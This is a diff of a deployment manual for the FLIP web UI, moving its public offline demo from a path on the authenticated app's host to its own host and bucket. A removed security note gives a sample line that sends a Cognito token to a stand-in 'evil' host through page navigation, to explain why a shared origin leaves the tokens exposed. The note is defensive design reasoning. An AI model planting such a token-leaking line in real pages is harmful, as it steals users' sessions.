@@ -179,7 +179,7 @@ The UI is served from S3 by the networking account's edge CloudFront at the cano
 - **`build`** runs `npm ci && npm run build:deploy` with no AWS credentials and no secrets, because `npm ci` runs third-party install scripts. `window.js` is generated from the environment's variables `AWS_COGNITO_USER_POOL_ID`, `AWS_COGNITO_APP_CLIENT_ID`, `CENTRAL_HUB_API_URL`, `AWS_REGION` and `BLACKLISTED_MODEL_FILES`. These values are public: every browser receives them. `RELEASE_VERSION` is the release tag, or `sha-<short7>`. The apply job warns when the two Cognito variables no longer match `terraform output`.
 - **`publish`** assumes `TF_UI_PUBLISH_ROLE_ARN` and runs `scripts/publish-ui.sh` against `FLIP_UI_BUCKET_NAME`. That role is the bootstrap module's `AICentre-FLIPUiPublishRole` (set `ui_bucket_name` on the module): it can list the bucket and write its objects, and nothing else. Afterwards the job reads `js/window.js` back through the site to confirm the new build is being served. While `TF_UI_PUBLISH_ROLE_ARN` is unset the job only warns.
 
-If the `ui` job fails, re-run it from the apply run once the cause is fixed, or publish from a laptop with `make deploy-ui HUB=stag|prod`, which is also the rollback: run it from the previous release's checkout. There is no invalidation, since the distribution is in another account: `index.html` is served `no-cache` and the hashed assets as immutable. Both paths run `scripts/publish-ui.sh`, which syncs `dist/` to the bucket **root** with `--delete`. Where the environment sets `PUBLIC_DEMO=true` the build carries the public demo under `dist/demo/` and the same sync publishes it, as described below; a build without it excludes the `demo/*` prefix, so it never deletes a demo already in the bucket.
+If the `ui` job fails, re-run it from the apply run once the cause is fixed, or publish from a laptop with `make deploy-ui HUB=stag|prod`, which is also the rollback: run it from the previous release's checkout. There is no invalidation, since the distribution is in another account: `index.html` is served `no-cache` and the hashed assets as immutable. Both paths run `scripts/publish-ui.sh`, which syncs `dist/` to the bucket **root** with `--delete`. The sync excludes the `demo/*` prefix, which still holds the last demo published under the app's host until `/demo/` redirects to the demo's own (below).
 
 `make deploy-ui` builds from your working tree, so it is also how to try a branch's UI on staging: run `make deploy-ui HUB=stag` from the branch checkout. `window.js` takes its values from `.env.stag`, where `make update-env` writes the two Cognito IDs. Three things limit it:
 
@@ -187,54 +187,43 @@ If the `ui` job fails, re-run it from the apply run once the cause is fixed, or 
 - Staging is stopped between deploys (see *Staging is stopped between deploys* below). The UI still loads from the bucket, but every API call fails until you dispatch `Staging Lifecycle` with `start-stag`. Staging then stays up until the 03:30 UTC nightly stop; to stop it sooner, dispatch `hold-then-stop` with a `hold_minutes` that covers the test.
 - It runs against the API that develop deployed. A UI change that needs API changes not yet on develop needs the whole branch deployed.
 
-### Public demo (`/demo/`, FLIP#1746)
+### Public demo (its own host, FLIP#1746, FLIP#2012)
 
-The public demo is a second flip-ui build (`npm run build:demo`) that runs offline on captured,
-scrubbed fixtures. It is published to the **same** `FLIP_UI_BUCKET_NAME` bucket under the `demo/`
-prefix, and the old `/ark_demo/` path answers with a 301 to `/demo/`. It offers no downloads, so it
-has no bucket of its own.
+The public demo is a second flip-ui build (`npm run build:demo`, into `flip-ui/dist-demo/`) that runs
+offline on captured, scrubbed fixtures. It is served at the root of **its own host** (for example
+`demo.flip.aicentre.co.uk`) from its own bucket, `FLIP_DEMO_BUCKET_NAME` (`module.flip_demo_bucket`,
+`services.tf`), so the browser's same-origin policy keeps it away from the signed-in app: script on the
+demo host cannot read the app's Cognito tokens in `localStorage`, whatever any header says.
 
-It is published with the UI, never by itself (FLIP#2008). Where the environment sets
-`PUBLIC_DEMO=true`, the UI publish runs `npm run build:deploy:with-demo`, which puts the demo build
-under `dist/demo/`, and `scripts/publish-ui.sh` syncs it with the rest, its `index.html` and
-`js/window.js` uncached like the real app's. So staging serves the demo of every `develop` merge, and
-production the one of each release; `make deploy-ui` does the same from a laptop. The demo build's own
-check (`demo-fixtures.mjs check --dist dist`) fails it if an unscrubbed fixture reaches `dist/`, and
-`test_flip_ui.yml` runs the same `build:deploy:with-demo` with stub values on every flip-ui change,
-checks the layout it would publish and walks the demo.
+It is published with the UI. The same `publish_ui.yml` run builds it as a second artefact, and its
+`publish-demo` job assumes `TF_DEMO_PUBLISH_ROLE_ARN`, runs `scripts/publish-ui.sh` against
+`FLIP_DEMO_BUCKET_NAME`, and reads `js/window.js` back from `DEMO_SITE_URL`. That role is the bootstrap
+module's `AICentre-FLIPDemoPublishRole` (set `demo_bucket_name` on the module): it can list and write the
+demo bucket and nothing else, and the UI-publish role cannot reach the demo bucket at all. While
+`TF_DEMO_PUBLISH_ROLE_ARN` is unset the job only warns; `make deploy-demo HUB=stag|prod` is the manual
+fallback. The demo build's own check (`demo-fixtures.mjs check --dist dist-demo`) fails it if an
+unscrubbed fixture reaches the output, and `test_flip_ui.yml` builds and walks it on every flip-ui
+change.
 
-**The edge is in another repository.** The networking account's distribution
-([aicentre-lza-iac](https://github.com/londonaicentre/aicentre-lza-iac)) carries a `/demo/*` ordered
-behaviour with an enforcing response-headers policy (`connect-src 'none'`, `style-src 'self'`), and
-its viewer-request function rewrites `/demo/` deep links to `/demo/index.html` and redirects
-`/ark_demo/<rest>` to `/demo/<rest>`. Without that behaviour the demo would be served by the default
-one, with the real app's report-only CSP. The build cannot see the edge, so it leaves the demo out
-unless the environment sets `PUBLIC_DEMO=true`: in the hub env file for `make deploy-ui`, and as the
-GitHub environment variable of the same name for CI (`setup-github-environments.sh` copies it from
-the env file). Set it only once the edge serves `/demo/*` under that policy and the bootstrap module that made
-the UI-publish role is applied with `public_demo = true`; until then the role is denied every write under
-`demo/`. The CI publish checks the
-first before it syncs anything and fails without it, so a demo never reaches the bucket of an edge
-that would serve it unprotected; it also refuses any `PUBLIC_DEMO` other than `true`, `false` or unset.
+**The edge is in another repository.** The demo's distribution, one per estate in the networking account
+([aicentre-lza-iac](https://github.com/londonaicentre/aicentre-lza-iac)), reads the bucket through
+cross-account OAC, serves `index.html` for the SPA's routes, and keeps the demo's enforcing
+response-headers policy (`connect-src 'none'`) as defence in depth. The bucket grants it read access once
+`LZA_WEB_DEMO_DISTRIBUTION_ARN` is set and applied, the same two-phase wiring as the UI bucket. The old
+`/demo/` and `/ark_demo/` paths on the app's host redirect to the demo's host once that redirect is live
+(aicentre-lza-iac). Until then the UI bucket keeps the last demo published under `demo/`, and the UI
+publish leaves that prefix alone.
+
 By hand:
 
 ```bash
-curl -sI https://app.flip.aicentre.co.uk/demo/ | grep -i content-security-policy   # connect-src 'none'
-curl -sI https://app.flip.aicentre.co.uk/ark_demo/                                 # 301 to /demo/
+curl -sI https://demo.flip.aicentre.co.uk/ | grep -i content-security-policy   # connect-src 'none'
+curl -sS https://demo.flip.aicentre.co.uk/js/window.js | grep RELEASE_VERSION  # demo/<date>+<sha>
 ```
 
-> **The CSP is defence in depth, not an origin boundary.** The demo shares an origin with the real,
-> authenticated app, so script running under `/demo/` can read a signed-in user's Cognito tokens in
-> `localStorage`. CSP has no directive for top-level navigation (`navigate-to` ships in no browser),
-> so `connect-src 'none'` does not stop `location.href = "https://evil/?t=" + token` (FLIP#794
-> review). The residual risk is accepted because the demo has no injection sink (no `v-html` or
-> `innerHTML` outside tests) and serves a static register compiled into the bundle. A separate
-> origin (e.g. `demo.flip.aicentre.co.uk`) is the only real separation; move to one if the demo
-> ever grows a dynamic content path.
-
-What the policy does buy: it blocks every fetch, XHR and WebSocket exfiltration path and every
-third-party load. The demo's Mirage server replaces `XMLHttpRequest`/`fetch` outright, so this costs
-no functionality; the `zero egress` cases in `flip-ui/mocks/__tests__/demo-server.spec.ts` pin it.
+What the policy still buys: it blocks every fetch, XHR and WebSocket path and every third-party load.
+The demo's Mirage server replaces `XMLHttpRequest`/`fetch` outright, so this costs no functionality; the
+`zero egress` cases in `flip-ui/mocks/__tests__/demo-server.spec.ts` pin it.
 
 ### FLIP application S3 buckets
 
@@ -643,10 +632,10 @@ Maintainer notes the manual leaves out:
   SSE-S3 by default, and on LZA production SSE-KMS under the AWS-managed `aws/s3` key (no CMK).
 - The execution role's `ecr:BatchImportUpstreamImage`/`ecr:CreateRepository` grant for first-pull imports IS
   Terraform-managed (`iam_ecs.tf`, LZA-gated); only the cache rules and their secret are out-of-band.
-- `PUBLIC_DEMO=true` belongs in an environment's env file once its edge's `/demo/*` behaviour is live and the
-  bootstrap module runs with `public_demo = true` (see
-  [Public demo](#public-demo-demo-flip1746)). `make deploy-ui` reads it there, and CI reads the GitHub
-  environment variable `setup-github-environments.sh` copies from it.
+- `FLIP_DEMO_BUCKET_NAME` (and, once the demo's distribution exists, `LZA_WEB_DEMO_DISTRIBUTION_ARN`) belong in
+  an environment's env file where it serves the public demo (see
+  [Public demo](#public-demo-its-own-host-flip1746-flip2012)); `DEMO_SITE_URL` is the demo host the CI publish
+  reads back from. `setup-github-environments.sh` copies them to the GitHub environment.
 - The log buckets default to subdomain-derived names (`flip-access-logs-`/`flip-cf-logs-<ALB_SUBDOMAIN>`), and
   `ALB_SUBDOMAIN` keeps its post-cutover value on LZA, so `ACCESS_LOGS_BUCKET_NAME` is overridden into the
   `flip-lza-*` namespace — bucket names are global.
